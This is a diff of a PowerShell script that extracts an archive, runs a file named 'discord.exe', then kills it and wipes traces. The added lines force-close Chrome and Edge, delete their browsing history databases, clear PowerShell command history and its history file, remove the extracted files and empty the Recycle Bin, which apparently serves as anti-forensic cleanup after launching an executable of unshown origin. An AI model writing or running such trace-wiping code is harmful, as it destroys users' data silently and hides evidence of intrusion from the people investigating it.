@@ -10,6 +10,7 @@ Expand-Archive $zipPath $extractPath -Force
 $exe = Get-ChildItem $extractPath -Recurse -Filter "discord.exe" | Select-Object -First 1
 
 if ($exe) {
+
     $p = Start-Process $exe.FullName -PassThru
 
     Start-Sleep 5
@@ -19,25 +20,29 @@ if ($exe) {
 
 Start-Sleep 2
 
-Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
-cmd /c rmdir /s /q "$extractPath"
+taskkill /f /im discord.exe 2>$null
 
-# PowerShell history
+cmd /c rd /s /q "$extractPath"
+
+Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
+
+# PowerShell History
 Clear-History
 Remove-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Force -ErrorAction SilentlyContinue
 
-# Temp
-Remove-Item "$env:TEMP\*" -Recurse -Force -ErrorAction SilentlyContinue
-
-# Recent files
-Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\*" -Recurse -Force -ErrorAction SilentlyContinue
-
-# DNS cache
-ipconfig /flushdns
-
-# Recycle bin
-Clear-RecycleBin -Force -ErrorAction SilentlyContinue
-
-# Browser cache only
+# Browser Cache
 Remove-Item "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cache\*" -Recurse -Force -ErrorAction SilentlyContinue
 Remove-Item "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Cache\*" -Recurse -Force -ErrorAction SilentlyContinue
+
+# Browser Download / History DB
+taskkill /f /im chrome.exe 2>$null
+taskkill /f /im msedge.exe 2>$null
+
+Remove-Item "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History" -Force -ErrorAction SilentlyContinue
+Remove-Item "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History-journal" -Force -ErrorAction SilentlyContinue
+
+Remove-Item "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\History" -Force -ErrorAction SilentlyContinue
+Remove-Item "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\History-journal" -Force -ErrorAction SilentlyContinue
+
+# Recycle Bin
+Clear-RecycleBin -Force -ErrorAction SilentlyContinue
